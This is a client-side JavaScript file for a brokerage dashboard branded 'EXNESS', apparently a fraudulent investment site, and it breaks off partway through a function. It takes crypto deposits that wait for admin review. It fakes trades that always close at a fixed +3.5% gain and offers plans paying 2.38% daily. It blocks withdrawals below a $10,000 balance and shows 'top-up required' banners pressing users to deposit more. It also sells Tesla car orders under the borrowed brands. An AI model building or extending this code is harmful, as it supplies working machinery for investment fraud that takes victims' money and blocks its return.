(function () {
    'use strict';

    const client = window.supabaseClient;
    if (!client) return;

    // Helper: format currency
    function formatUSD(amount) {
        const num = Number(amount) || 0;
        return '$' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    function formatShortUSD(amount) {
        const num = Number(amount) || 0;
        return '$' + num.toLocaleString('en-US');
    }

    function formatDate(d) {
        const date = d ? new Date(d) : new Date();
        return date.toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' });
    }

    function formatTime(d) {
        const date = d ? new Date(d) : new Date();
        return date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
    }

    function displayName(user) {
        return user.user_metadata?.username || user.user_metadata?.full_name || user.email?.split('@')[0] || 'Investor';
    }

    function initials(name) {
        return name.split(/\s+/).filter(Boolean).slice(0, 2).map((part) => part[0].toUpperCase()).join('') || 'IN';
    }

    function escapeHtml(value) {
        return String(value ?? '')
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    function avatarStorageKey(user) {
        return `profile-avatar:${user.id}`;
    }

    function accountStorageKey(user) {
        return `broker_account_${user.id}`;
    }

    // Default clean account template
    function createDefaultAccountData(user) {
        const name = displayName(user);
        return {
            balance: 0.00,
            activeInvest: 0.00,
            totalProfit: 0.00,
            totalWithdrawn: 0.00,
            activePlan: null,
            activeCarOrder: null,
            deposits: [],
            withdrawals: [],
            trades: [],
            investments: [],
            carOrders: [],
            transactions: [],
            notifications: [
                {
                    id: 'notif_welcome',
                    title: 'Welcome to EXNESS',
                    detail: `Welcome ${name}! Your account is active. Fund your portfolio to start trading and investing.`,
                    icon: 'shield-check',
                    time: 'Just now',
                    unread: true
                }
            ]
        };
    }

    // In-memory account store for active user
    let currentAccountData = null;
    let currentUser = null;
    let saveTimeout = null;
    let accountSuspended = false;
    let accountTopUpRequired = false;
    const MIN_WITHDRAWAL_BALANCE = 10000;

    function showSuspendedBanner() {
        const existing = document.querySelector('[data-suspended-banner]');
        if (existing) {
            existing.innerHTML = accountTopUpRequired
                ? 'Your account is ineligible to trade. Top-up now to trade.'
                : 'Your account has been suspended because it does not follow our safety guidelines.';
            existing.style.background = accountTopUpRequired ? '#f59e0b' : '#dc2626';
            applySuspendedBannerLayout(existing);
            return;
        }

        const banner = document.createElement('div');
        banner.setAttribute('data-suspended-banner', '');
        banner.style.position = 'fixed';
        banner.style.top = '0';
        banner.style.left = '0';
        banner.style.right = '0';
        banner.style.zIndex = '9999';
        banner.style.width = '100%';
        banner.style.minHeight = '36px';
        banner.style.padding = '10px 16px';
        banner.style.display = 'flex';
        banner.style.alignItems = 'center';
        banner.style.justifyContent = 'center';
        banner.style.textAlign = 'center';
        banner.style.background = accountTopUpRequired ? '#f59e0b' : '#dc2626';
        banner.style.color = '#ffffff';
        banner.style.fontSize = '12px';
        banner.style.fontWeight = '800';
        banner.style.lineHeight = '1.3';
        banner.style.boxSizing = 'border-box';
        banner.style.borderBottom = '1px solid rgba(255,255,255,0.2)';
        banner.style.margin = '0';
        banner.style.overflow = 'hidden';
        banner.innerHTML = accountTopUpRequired
            ? 'Your account is ineligible to trade. Top-up now to trade.'
            : 'Your account has been suspended because it does not follow our safety guidelines.';

        document.body.appendChild(banner);
        applySuspendedBannerLayout(banner);
    }

    function applySuspendedBannerLayout(banner) {
        const bannerHeight = Math.ceil(banner.getBoundingClientRect().height);
        document.body.style.paddingTop = `${bannerHeight}px`;

        document.querySelectorAll('aside, header').forEach((element) => {
            const position = window.getComputedStyle(element).position;
            if (position === 'fixed' || position === 'sticky') {
                element.style.top = `${bannerHeight}px`;
            }
        });
    }

    function updateSuspendedStatusUI() {
        const statusPills = document.querySelectorAll('[data-user-status-pill]');
        const isRestricted = accountSuspended || accountTopUpRequired;
        statusPills.forEach((el) => {
            el.textContent = accountTopUpRequired ? 'Top-up Required' : accountSuspended ? 'Suspended' : 'Active';
            el.className = accountTopUpRequired
                ? 'inline-flex items-center rounded-full border border-amber-500/30 bg-amber-500/10 px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider text-amber-700 dark:text-amber-300'
                : accountSuspended
                ? 'inline-flex items-center rounded-full border border-red-500/30 bg-red-500/10 px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider text-red-600 dark:text-red-300'
                : 'inline-flex items-center rounded-full border border-green-500/30 bg-green-500/10 px-2.5 py-1 text-[10px] font-bold uppercase tracking-wider text-green-600 dark:text-green-300';
        });

        const profileStatus = document.querySelector('[data-profile-status-banner]');
        if (profileStatus) {
            profileStatus.hidden = !isRestricted;
            if (accountTopUpRequired) {
                profileStatus.innerHTML = '<div class="rounded-2xl border border-amber-500/30 bg-amber-500/10 p-4 text-amber-700 dark:text-amber-300"><div class="flex items-center gap-3"><i data-lucide="shield-alert" class="h-5 w-5"></i><div><p class="text-sm font-black">Top-up required</p><p class="text-xs text-amber-700/80 dark:text-amber-300/80">Your account is ineligible to trade. Top-up now to trade.</p></div></div></div>';
            } else if (accountSuspended) {
                profileStatus.innerHTML = '<div class="rounded-2xl border border-red-500/30 bg-red-500/10 p-4 text-red-700 dark:text-red-300"><div class="flex items-center gap-3"><i data-lucide="shield-alert" class="h-5 w-5"></i><div><p class="text-sm font-black">Account suspended</p><p class="text-xs text-red-700/80 dark:text-red-300/80">Your account has been suspended because it does not follow our safety guidelines.</p></div></div></div>';
            }
            if (window.lucide && typeof window.lucide.createIcons === 'function') {
                window.lucide.createIcons();
            }
        }

        if (isRestricted) {
            showSuspendedBanner();
            document.body.classList.add('suspended-user');
        } else {
            const banner = document.querySelector('[data-suspended-banner]');
            if (banner) banner.remove();
            document.body.style.paddingTop = '';
            document.querySelectorAll('aside, header').forEach((element) => {
                element.style.top = '';
            });
            document.body.classList.remove('suspended-user');
        }
    }

    function loadAccountData(user) {
        const key = accountStorageKey(user);
        const localRaw = localStorage.getItem(key);
        const cloudData = user.user_metadata?.account_data;

        let data = null;

        if (localRaw) {
            try {
                data = JSON.parse(localRaw);
            } catch (e) {
                data = null;
            }
        }

        // Merge cloud data if local is empty or older
        if (!data && cloudData) {
            data = cloudData;
        } else if (data && cloudData) {
            // Keep the most comprehensive set
            data.balance = data.balance ?? cloudData.balance ?? 0;
            data.activeInvest = data.activeInvest ?? cloudData.activeInvest ?? 0;
            data.totalProfit = data.totalProfit ?? cloudData.totalProfit ?? 0;
            data.totalWithdrawn = data.totalWithdrawn ?? cloudData.totalWithdrawn ?? 0;
            data.activePlan = data.activePlan || cloudData.activePlan || null;
            data.activeCarOrder = data.activeCarOrder || cloudData.activeCarOrder || null;
            if ((!data.transactions || data.transactions.length === 0) && cloudData.transactions?.length) {
                data.transactions = cloudData.transactions;
            }
            if ((!data.notifications || data.notifications.length === 0) && cloudData.notifications?.length) {
                data.notifications = cloudData.notifications;
            }
        }

        if (!data) {
            data = createDefaultAccountData(user);
        }

        // Ensure all arrays exist
        data.deposits = data.deposits || [];
        data.withdrawals = data.withdrawals || [];
        data.trades = data.trades || [];
        data.investments = data.investments || [];
        data.carOrders = data.carOrders || [];
        data.transactions = data.transactions || [];
        data.notifications = data.notifications || [];

        currentAccountData = data;
        localStorage.setItem(key, JSON.stringify(data));
        return data;
    }

    async function persistAccountData() {
        if (!currentUser || !currentAccountData) return;
        const key = accountStorageKey(currentUser);
        localStorage.setItem(key, JSON.stringify(currentAccountData));

        // Debounce cloud sync to Supabase user_metadata and public.profiles
        if (saveTimeout) clearTimeout(saveTimeout);
        saveTimeout = setTimeout(async () => {
            try {
                await client.auth.updateUser({
                    data: {
                        account_data: currentAccountData
                    }
                });
            } catch (err) {
                console.warn('Background Supabase metadata sync:', err);
            }

            try {
                await client.from('profiles').update({
                    balance: currentAccountData.balance,
                    active_invest: currentAccountData.activeInvest,
                    total_profit: currentAccountData.totalProfit,
                    total_withdrawn: currentAccountData.totalWithdrawn,
                    updated_at: new Date().toISOString()
                }).eq('id', currentUser.id);
            } catch (pErr) {
                // Table might not exist or network unavailable
            }
        }, 500);
    }

    // Apple-style subtle toast alert
    function showAppleToast(message, type = 'success') {
        let toast = document.querySelector('[data-broker-toast]');
        let backdrop = document.querySelector('[data-broker-toast-backdrop]');
        if (!backdrop) {
            backdrop = document.createElement('div');
            backdrop.setAttribute('data-broker-toast-backdrop', '');
            backdrop.className = 'broker-toast-backdrop';
            document.body.appendChild(backdrop);
        }
        if (!toast) {
            toast = document.createElement('div');
            toast.setAttribute('data-broker-toast', '');
            toast.className = 'broker-toast';
            document.body.appendChild(toast);
        }

        const isSuccess = type === 'success';
        const iconHtml = isSuccess
            ? '<span class="broker-toast__icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.7" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.5 9.2 17 19 7"></path></svg></span>'
            : '<span class="broker-toast__icon" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.7" stroke-linecap="round"><path d="m7 7 10 10M17 7 7 17"></path></svg></span>';

        toast.className = `broker-toast broker-toast--${isSuccess ? 'success' : 'error'} is-visible`;
        toast.innerHTML = `${iconHtml}<span class="broker-toast__message"></span>`;
        toast.querySelector('.broker-toast__message').textContent = String(message ?? '');
        backdrop.classList.add('is-visible');
        toast.style.pointerEvents = 'auto';

        if (toast.__hideTimer) clearTimeout(toast.__hideTimer);

        toast.__hideTimer = setTimeout(() => {
            toast.classList.remove('is-visible');
            toast.classList.add('is-hiding');
            backdrop.classList.remove('is-visible');
            toast.style.pointerEvents = 'none';
            setTimeout(() => toast.classList.remove('is-hiding'), 240);
        }, 1000);
    }

    // Account Store Public Methods
    const brokerAccount = {
        getUser() {
            return currentUser;
        },
        getData() {
            return currentAccountData;
        },
        formatUSD,
        showToast: showAppleToast,

        // 1. DEPOSIT
        deposit({ amount, asset, network, address, txid }) {
            if (accountSuspended && !accountTopUpRequired) {
                showAppleToast('Your account is suspended and cannot make deposits.', 'error');
                return false;
            }

            const num = parseFloat(amount);
            if (isNaN(num) || num <= 0) {
                showAppleToast('Please enter a valid deposit amount', 'error');
                return false;
            }

            const transactionId = txid || ('TX-' + Math.floor(1000000 + Math.random() * 9000000));
            const depositRecord = {
                id: 'dep_' + Date.now(),
                txid: transactionId,
                amount: num,
                asset: asset || 'USDT',
                network: network || 'TRC-20',
                address: address || '',
                date: new Date().toISOString(),
                status: 'Pending'
            };

            currentAccountData.deposits.unshift(depositRecord);

            currentAccountData.transactions.unshift({
                id: depositRecord.id,
                txid: transactionId,
                type: 'Deposit',
                asset: `${depositRecord.asset} (${depositRecord.network})`,
                amount: num,
                formattedAmount: `+${formatUSD(num)}`,
                date: `${formatDate()} · ${formatTime()}`,
                status: 'Pending',
                isPositive: true
            });

            currentAccountData.notifications.unshift({
                id: 'notif_' + Date.now(),
                title: 'Deposit Pending Review',
                detail: `Your deposit request of ${formatUSD(num)} via ${depositRecord.asset} is under admin review and will be credited once approved.`,
                icon: 'download',
                time: 'Just now',
                unread: true
            });

            if (currentUser) {
                client.from('deposits').insert({
                    user_id: currentUser.id,
                    txid: transactionId,
                    asset: depositRecord.asset,
                    network: depositRecord.network,
                    address: depositRecord.address,
                    amount: num,
                    status: 'pending'
                }).then(() => {}).catch(() => {});

                client.from('transactions').insert({
                    user_id: currentUser.id,
                    txid: transactionId,
                    type: 'Deposit',
                    asset: `${depositRecord.asset} (${depositRecord.network})`,
                    amount: num,
                    status: 'pending',
                    is_positive: true
                }).then(() => {}).catch(() => {});
            }

            persistAccountData();
            hydrateUI();
            showAppleToast(`Deposit request of ${formatUSD(num)} submitted for review.`);
            return true;
        },

        // 2. WITHDRAWAL
        withdraw({ amount, network, address }) {
            if (accountSuspended || accountTopUpRequired) {
                showAppleToast('Your account is ineligible to trade. Top-up now to trade.', 'error');
                return false;
            }

            if (Number(currentAccountData?.balance) < MIN_WITHDRAWAL_BALANCE) {
                showAppleToast('You are ineligible to withdraw. A minimum balance of $10,000 is required.', 'error');
                return false;
            }

            const num = parseFloat(amount);
            if (isNaN(num) || num <= 0) {
                showAppleToast('Please enter a valid withdrawal amount', 'error');
                return false;
            }

            if (num > currentAccountData.balance) {
                showAppleToast(`Insufficient balance. Available: ${formatUSD(currentAccountData.balance)}`, 'error');
                return false;
            }

            const fee = 1.00;
            const net = Math.max(0, num - fee);
            const transactionId = 'TX-' + Math.floor(1000000 + Math.random() * 9000000);

            const withdrawalRecord = {
                id: 'wd_' + Date.now(),
                txid: transactionId,
                amount: num,
                fee: fee,
                netAmount: net,
                network: network || 'USDT (TRC-20)',
                address: address || '',
                date: new Date().toISOString(),
                status: 'Pending'
            };

            currentAccountData.withdrawals.unshift(withdrawalRecord);

            currentAccountData.transactions.unshift({
                id: withdrawalRecord.id,
                txid: transactionId,
                type: 'Withdrawal',
                asset: withdrawalRecord.network,
                amount: num,
                formattedAmount: `-${formatUSD(num)}`,
                date: `${formatDate()} · ${formatTime()}`,
                status: 'Pending',
                isPositive: false
            });

            currentAccountData.notifications.unshift({
                id: 'notif_' + Date.now(),
                title: 'Withdrawal Request Submitted',
                detail: `${formatUSD(net)} is awaiting approval and will be dispatched after review.`,
                icon: 'upload',
                time: 'Just now',
                unread: true
            });

            // Async sync to Supabase database tables
            if (currentUser) {
                client.from('withdrawals').insert({
                    user_id: currentUser.id,
                    txid: transactionId,
                    amount: num,
                    fee: fee,
                    net_amount: net,
                    network: withdrawalRecord.network,
                    address: withdrawalRecord.address,
                    status: 'pending'
                }).then(() => {}).catch(() => {});

                client.from('transactions').insert({
                    user_id: currentUser.id,
                    txid: transactionId,
                    type: 'Withdrawal',
                    asset: withdrawalRecord.network,
                    amount: num,
                    fee: fee,
                    status: 'pending',
                    is_positive: false
                }).then(() => {}).catch(() => {});
            }

            persistAccountData();
            hydrateUI();
            showAppleToast(`Withdrawal request of ${formatUSD(num)} submitted for approval.`);
            return true;
        },

        // 3. EXECUTE TRADE
        trade({ symbol, side, amount, leverage, orderType }) {
            if (accountSuspended || accountTopUpRequired) {
                showAppleToast('Your account is ineligible to trade. Top-up now to trade.', 'error');
                return false;
            }

            const num = parseFloat(amount);
            if (isNaN(num) || num <= 0) {
                showAppleToast('Please enter a valid trade contract amount', 'error');
                return false;
            }

            if (num > currentAccountData.balance) {
                showAppleToast(`Margin exceeds available balance (${formatUSD(currentAccountData.balance)}). Deposit to trade.`, 'error');
                return false;
            }

            const levNum = parseInt(leverage) || 1;
            const entryPrices = { 'TSLA': 248.50, 'NVDA': 118.20, 'BTC': 59420.00, 'ETH': 2480.00 };
            const entry = entryPrices[symbol] || 248.50;
            const transactionId = 'TX-' + Math.floor(1000000 + Math.random() * 9000000);

            const tradeRecord = {
                id: 'pos_' + Date.now(),
                txid: transactionId,
                symbol: symbol || 'TSLA',
                side: side || 'buy',
                amount: num,
                leverage: `${levNum}x`,
                nominalPosition: num * levNum,
                entryPrice: entry,
                currentPrice: entry,
                pnl: 0.00,
                status: 'Open',
                date: new Date().toISOString()
            };

            currentAccountData.trades.unshift(tradeRecord);

            currentAccountData.transactions.unshift({
                id: tradeRecord.id,
                txid: transactionId,
                type: `${side.toUpperCase()} Order`,
                asset: `${symbol} (${levNum}x Leverage)`,
                amount: num,
                formattedAmount: `${formatUSD(num)} Margin`,
                date: `${formatDate()} · ${formatTime()}`,
                status: 'Active',
                isPositive: side === 'buy'
            });

            currentAccountData.notifications.unshift({
                id: 'notif_' + Date.now(),
                title: 'Trade Executed',
                detail: `Opened ${side.toUpperCase()} on ${symbol} ($${num.toLocaleString()} margin at ${levNum}x leverage).`,
                icon: 'trending-up',
                time: 'Just now',
                unread: true
            });

            if (currentUser) {
                client.from('transactions').insert({
                    user_id: currentUser.id,
                    txid: transactionId,
                    type: `${side.toUpperCase()} Order`,
                    asset: `${symbol} (${levNum}x Leverage)`,
                    amount: num,
                    status: 'confirmed',
                    is_positive: side === 'buy'
                }).then(() => {}).catch(() => {});
            }

            persistAccountData();
            hydrateUI();
            showAppleToast(`${side.toUpperCase()} ${symbol} order executed!`);
            return true;
        },

        // 4. CLOSE TRADE
        closeTrade(tradeId) {
            const index = currentAccountData.trades.findIndex((t) => t.id === tradeId);
            if (index === -1) return;

            const trade = currentAccountData.trades[index];
            // Simulate simulated reasonable gain/loss (e.g. +3.5%)
            const pnl = trade.amount * 0.035;
            trade.status = 'Closed';
            trade.pnl = pnl;

            currentAccountData.balance += pnl;
            currentAccountData.totalProfit += Math.max(0, pnl);

            const closeTxId = 'TX-' + Math.floor(1000000 + Math.random() * 9000000);
            currentAccountData.transactions.unshift({
                id: 'close_' + Date.now(),
                txid: closeTxId,
                type: 'Closed Position',
                asset: `${trade.symbol} (${trade.side.toUpperCase()})`,
                amount: pnl,
                formattedAmount: pnl >= 0 ? `+${formatUSD(pnl)}` : `-${formatUSD(Math.abs(pnl))}`,
                date: `${formatDate()} · ${formatTime()}`,
                status: 'Settled',
                isPositive: pnl >= 0
            });

            if (currentUser) {
                client.from('transactions').insert({
                    user_id: currentUser.id,
                    txid: closeTxId,
                    type: 'Closed Position',
                    asset: `${trade.symbol} (${trade.side.toUpperCase()})`,
                    amount: pnl,
                    status: 'confirmed',
                    is_positive: pnl >= 0
                }).then(() => {}).catch(() => {});
            }

            persistAccountData();
            hydrateUI();
            showAppleToast(`Position closed. P&L: +${formatUSD(pnl)}`);
        },

        // 5. SUBSCRIBE TO INVESTMENT PLAN
        invest({ planName, capital, dailyRate, durationDays }) {
            if (accountSuspended) {
                showAppleToast('Your account is suspended and investment actions are disabled.', 'error');
                return false;
            }

            const cap = parseFloat(capital);
            if (isNaN(cap) || cap <= 0) {
                showAppleToast('Please enter an investment amount', 'error');
                return false;
            }

            if (cap > currentAccountData.balance) {
                showAppleToast(`Insufficient balance (${formatUSD(currentAccountData.balance)}). Deposit to subscribe.`, 'error');
                return false;
            }

            currentAccountData.balance -= cap;
            currentAccountData.activeInvest += cap;

            const rate = parseFloat(dailyRate) || 2.38;
            const days = parseInt(durationDays) || 21;
            const dailyPayout = (cap * (rate / 100));

            const plan = {
                id: 'plan_' + Date.now(),
                name: planName || 'Gold 50% High-Yield Strategy',
                capital: cap,
                dailyRate: rate,
                dailyPayout: dailyPayout,
                totalDays: days,
                elapsedDays: 1,
                profitEarned: dailyPayout,
                status: 'Active',
                startDate: new Date().toISOString()
            };

            currentAccountData.activePlan = plan;
            currentAccountData.investments.unshift(plan);

            const planTxId = 'TX-' + Math.floor(1000000 + Math.random() * 9000000);
            currentAccountData.transactions.unshift({
                id: plan.id,
                txid: planTxId,
                type: 'Plan Subscription',
                asset: plan.name,
                amount: cap,
                formattedAmount: `-${formatUSD(cap)}`,
                date: `${formatDate()} · ${formatTime()}`,
                status: 'Active',
                isPositive: false
            });

            currentAccountData.notifications.unshift({
                id: 'notif_' + Date.now(),
                title: 'Investment Plan Activated',
                detail: `Subscribed to ${plan.name} with ${formatUSD(cap)} capital. Daily return: ${formatUSD(dailyPayout)}.`,
                icon: 'pie-chart',
                time: 'Just now',
                unread: true
            });

            if (currentUser) {
                client.from('transactions').insert({
                    user_id: currentUser.id,
                    txid: planTxId,
                    type: 'Plan Subscription',
                    asset: plan.name,
                    amount: cap,
                    status: 'confirmed',
                    is_positive: false
                }).then(() => {}).catch(() => {});
            }

            persistAccountData();
            hydrateUI();
            showAppleToast(`Subscribed to ${plan.name}!`);
            return true;
        },

        // 6. TESLA EV VEHICLE ORDER
        orderCar({ model, price, deposit, color, vin }) {
            if (accountSuspended) {
                showAppleToast('Your account is suspended and EV orders are disabled.', 'error');
                return false;
            }

            const dep = parseFloat(deposit) || 250;
            const pr = parseFloat(price) || 94990;

            const order = {
                id: 'order_' + Date.now(),
                orderNumber: 'TSLA-' + Math.floor(10000 + Math.random() * 90000),
                model: model || 'Tesla Model X Plaid',
                price: pr,
                depositPaid: dep,
                color: color || 'Solid Black',
                vin: vin || '5YJSA1E28PF993810',
                status: 'In Transit',
                progress: 75,
                date: new Date().toISOString()
            };

            currentAccountData.activeCarOrder = order;
            currentAccountData.carOrders.unshift(order);

            currentAccountData.transactions.unshift({
                id: order.id,
                txid: order.orderNumber,
                type: 'Tesla EV Order',
                asset: order.model,
                amount: dep,
                formattedAmount: `-${formatUSD(dep)} Earnest`,
                date: `${formatDate()} · ${formatTime()}`,
                status: 'Confirmed',
                isPositive: false
            });

            currentAccountData.notifications.unshift({
                id: 'notif_' + Date.now(),
                title: 'Tesla EV Order Confirmed',
                detail: `Your ${order.model} order (${order.orderNumber}) is confirmed and in transit.`,
                icon: 'car',
                time: 'Just now',
                unread: true
            });

            if (currentUser) {
                client.from('transactions').insert({
                    user_id: currentUser.id,
                    txid: order.orderNumber,
                    type: 'Tesla EV Order',
                    asset: order.model,
                    amount: dep,
                    status: 'confirmed',
                    is_positive: false
                }).then(() => {}).catch(() => {});
            }

            persistAccountData();
            hydrateUI();
            showAppleToast(`Vehicle reserved! Order ${order.orderNumber}`);
            return true;
        },

        // 7. NOTIFICATIONS READ/UNREAD
        markNotificationRead(id) {
            const notif = currentAccountData.notifications.find((n) => n.id === id);
            if (notif) {
                notif.unread = false;
                persistAccountData();
                hydrateUI();
            }
        },
        markAllNotificationsRead() {
            currentAccountData.notifications.forEach((n) => { n.unread = false; });
            persistAccountData();
            hydrateUI();
        }
    };

    window.brokerAccount = brokerAccount;

    // Hydrate all DOM elements across all pages
    function hydrateUI() {
        if (!currentUser || !currentAccountData) return;

        const data = currentAccountData;
        const name = displayName(currentUser);
        const fullName = currentUser.user_metadata?.full_name || name;
        const username = currentUser.user_metadata?.username || name;

        updateSuspendedStatusUI();
        const phone = currentUser.user_metadata?.phone || '';
        const avatar = localStorage.getItem(avatarStorageKey(currentUser));

        // 1. Profile information
        document.querySelectorAll('[data-auth-name]').forEach((el) => {
            if ('value' in el) el.value = fullName;
            else el.textContent = fullName;
        });
        document.querySelectorAll('[data-auth-username]').forEach((el) => {
            if ('value' in el) el.value = username;
            else el.textContent = username;
        });
        document.querySelectorAll('[data-auth-email]').forEach((el) => {
            if ('value' in el) el.value = currentUser.email || '';
            else el.textContent = currentUser.email || '';
        });
        document.querySelectorAll('[data-auth-phone]').forEach((el) => { el.value = phone; });
        document.querySelectorAll('[data-auth-initials]').forEach((el) => { el.textContent = initials(fullName); });
        document.querySelectorAll('[data-auth-avatar]').forEach((el) => {
            if (avatar) {
                el.src = avatar;
                el.hidden = false;
                const fallback = el.parentElement?.querySelector('[data-auth-initials]');
                if (fallback) fallback.hidden = true;
            } else {
                el.hidden = true;
            }
        });
        document.querySelectorAll('[data-auth-user-id]').forEach((el) => { el.textContent = currentUser.id; });

        // 2. Balances across all pages
        document.querySelectorAll('[data-auth-balance]').forEach((el) => {
            el.textContent = formatUSD(data.balance);
        });
        document.querySelectorAll('[data-auth-active-invest]').forEach((el) => {
            el.textContent = formatUSD(data.activeInvest);
        });
        document.querySelectorAll('[data-auth-total-profit]').forEach((el) => {
            el.textContent = formatUSD(data.totalProfit);
        });
        document.querySelectorAll('[data-auth-withdrawn]').forEach((el) => {
            el.textContent = formatUSD(data.totalWithdrawn);
        });

        // Also update plain text balance headers in dashboard/index.html and dashboard/withdraw.html
        const mobileBalance = document.querySelector('section.sm\\:hidden h1.text-3xl');
        if (mobileBalance) mobileBalance.textContent = formatUSD(data.balance);

        const card1Balance = document.querySelector('.sm\\:grid > div:first-child .text-2xl');
        if (card1Balance) card1Balance.textContent = formatUSD(data.balance);

        const card2Capital = document.querySelector('.sm\\:grid > div:nth-child(2) .text-2xl');
        if (card2Capital) card2Capital.textContent = formatUSD(data.activeInvest);

        const card3Withdrawn = document.querySelector('.sm\\:grid > div:nth-child(3) .text-2xl');
        if (card3Withdrawn) card3Withdrawn.textContent = formatUSD(data.totalWithdrawn);

        const withdrawAvail = document.querySelector('[data-withdraw-available]');
        if (withdrawAvail) withdrawAvail.textContent = formatUSD(data.balance);

        // 3. Sync with Alpine store if Alpine exists
        if (window.Alpine && window.Alpine.store && window.Alpine.store('dashboard')) {
            const store = window.Alpine.store('dashboard');
            store.totalBalance = data.balance;
            store.activeInvest = data.activeInvest;
            store.totalProfit = data.totalProfit;
            store.notifications = data.notifications;
        }

        // 4. Update Notifications Dropdown
        const unreadCount = data.notifications.filter((n) => n.unread).length;
        document.querySelectorAll('[data-auth-unread-count]').forEach((el) => {
            el.textContent = unreadCount;
            el.hidden = unreadCount === 0;
        });

        // 5. Update Transactions Tables
        hydrateTransactionsTable(data.transactions);

        // 6. Update Open Trades Positions
        hydrateTradesTable(data.trades);

        // 7. Update Active Investment Plan Status Card
        hydrateActivePlan(data.activePlan);

        // 8. Update Active Car Order
        hydrateActiveCarOrder(data.activeCarOrder);

        // 9. Update Referral Link
        hydrateReferralLink(currentUser);

        // Recreate Lucide icons if dynamically updated
        if (window.lucide && typeof window.lucide.createIcons === 'function') {
            window.lucide.createIcons();
        }
    }

    // Dynamic Transactions Table Hydration
    function hydrateTransactionsTable(transactions) {
        const tableBody = document.querySelector('[data-transactions-tbody]');
        if (!tableBody) return;

        if (!transactions || transactions.length === 0) {
            tableBody.innerHTML = `
                <tr>
                    <td colspan="6" class="px-4 py-16 text-center text-sm text-gray-500">
                        <i data-lucide="inbox" class="mx-auto mb-3 h-8 w-8 text-gray-400"></i>
                        No activity yet. Deposits, withdrawals, and trades will appear here.
                    </td>
                </tr>`;
            return;
        }

        tableBody.innerHTML = transactions.map((t) => {
            const color = t.isPositive ? 'text-green-500' : 'text-primary-500';
            const normalizedStatus = normalizeTransactionStatus(t.status);
            const badgeBg = normalizedStatus === 'Confirmed'
                ? 'bg-green-100 dark:bg-green-950/60 text-green-600 dark:text-green-300'
                : normalizedStatus === 'Declined'
                ? 'bg-red-100 dark:bg-red-950/60 text-red-600 dark:text-red-300'
                : 'bg-primary-100 dark:bg-primary-950/60 text-primary-600 dark:text-primary-300';

            return `
                <tr class="hover:bg-gray-50/50 dark:hover:bg-gray-800/30 transition">
                    <td class="py-3 px-4 font-mono text-gray-500 text-xs">${escapeHtml(t.txid || 'TX-90281')}</td>
                    <td class="py-3 px-4 font-bold text-xs">${escapeHtml(t.type)}</td>
                    <td class="py-3 px-4 text-xs text-gray-600 dark:text-gray-300">${escapeHtml(t.asset)}</td>
                    <td class="py-3 px-4 font-bold text-xs ${color}">${escapeHtml(t.formattedAmount || formatUSD(t.amount))}</td>
                    <td class="py-3 px-4 text-xs text-gray-400">${escapeHtml(t.date)}</td>
                    <td class="py-3 px-4"><span class="px-2 py-0.5 rounded-full text-[10px] font-bold ${badgeBg}">${normalizedStatus}</span></td>
                </tr>`;
        }).join('');
    }

    window.filterTransactions = (filterType) => {
        if (!currentAccountData) return;
        const all = currentAccountData.transactions || [];
        const normalizedFilter = String(filterType || 'all').toLowerCase();
        const filtered = normalizedFilter === 'all'
            ? all
            : all.filter((transaction) => {
                const type = String(transaction.type || '').trim().toLowerCase();
                if (normalizedFilter === 'deposit') return type === 'deposit';
                if (normalizedFilter === 'withdrawal') return type === 'withdrawal';
                if (normalizedFilter === 'roi') return type !== 'deposit' && type !== 'withdrawal';
                return true;
            });
        hydrateTransactionsTable(filtered);
    };

    // Dynamic Open Positions Table Hydration (trades.html)
    function hydrateTradesTable(trades) {
        const tbody = document.querySelector('[data-trades-tbody]');
        if (!tbody) return;

        const openTrades = (trades || []).filter((t) => t.status === 'Open');
        if (openTrades.length === 0) {
            tbody.innerHTML = `
                <tr>
                    <td colspan="7" class="py-10 text-center text-sm text-gray-500">No open positions.</td>
                </tr>`;
            return;
        }

        tbody.innerHTML = openTrades.map((t) => {
            const sideBadge = t.side === 'buy'
                ? '<span class="px-2 py-0.5 bg-green-500/20 text-green-500 rounded font-bold uppercase text-[10px]">BUY</span>'
                : '<span class="px-2 py-0.5 bg-primary-500/20 text-primary-500 rounded font-bold uppercase text-[10px]">SELL</span>';

            return `
                <tr class="hover:bg-gray-50/50 dark:hover:bg-gray-800/30">
                    <td class="py-2.5 font-bold">${t.symbol}</td>
                    <td>${sideBadge}</td>
                    <td class="font-mono">$${t.entryPrice.toFixed(2)}</td>
                    <td class="font-mono">$${t.currentPrice.toFixed(2)}</td>
                    <td class="font-bold">${t.leverage}</td>
                    <td class="font-bold text-green-500 font-mono">+$0.00</td>
                    <td>
                        <button type="button" onclick="window.brokerAccount.closeTrade('${t.id}')" class="px-2 py-1 bg-red-500/10 hover:bg-red-500/20 text-red-500 text-[10px] font-bold rounded transition">
                            Close
                        </button>
                    </td>
                </tr>`;
        }).join('');
    }

    // Dynamic Active Plan Card Hydration
    function hydrateActivePlan(plan) {
        const planCard = document.querySelector('[data-active-plan-card]');
        const noPlanCard = document.querySelector('[data-no-plan-card]');

        if (plan) {
            if (planCard) planCard.hidden = false;
            if (noPlanCard) noPlanCard.hidden = true;

            document.querySelectorAll('[data-plan-name]').forEach((el) => el.textContent = plan.name);
            document.querySelectorAll('[data-plan-capital]').forEach((el) => el.textContent = formatUSD(plan.capital));
            document.querySelectorAll('[data-plan-daily-payout]').forEach((el) => el.textContent = `+${formatUSD(plan.dailyPayout)} / day`);
            document.querySelectorAll('[data-plan-profit]').forEach((el) => el.textContent = `+${formatUSD(plan.profitEarned)} Earned`);
            document.querySelectorAll('[data-plan-progress-bar]').forEach((el) => {
                const pct = Math.min(100, Math.round((plan.elapsedDays / plan.totalDays) * 100));
                el.style.width = `${pct}%`;
            });
        } else {
            if (planCard) planCard.hidden = true;
            if (noPlanCard) noPlanCard.hidden = false;
        }
    }

    // Dynamic Tesla EV Order Hydration
    function hydrateActiveCarOrder(order) {
        const carCard = document.querySelector('[data-active-car-card]');
        if (!carCard) return;

        if (order) {
            carCard.hidden = false;
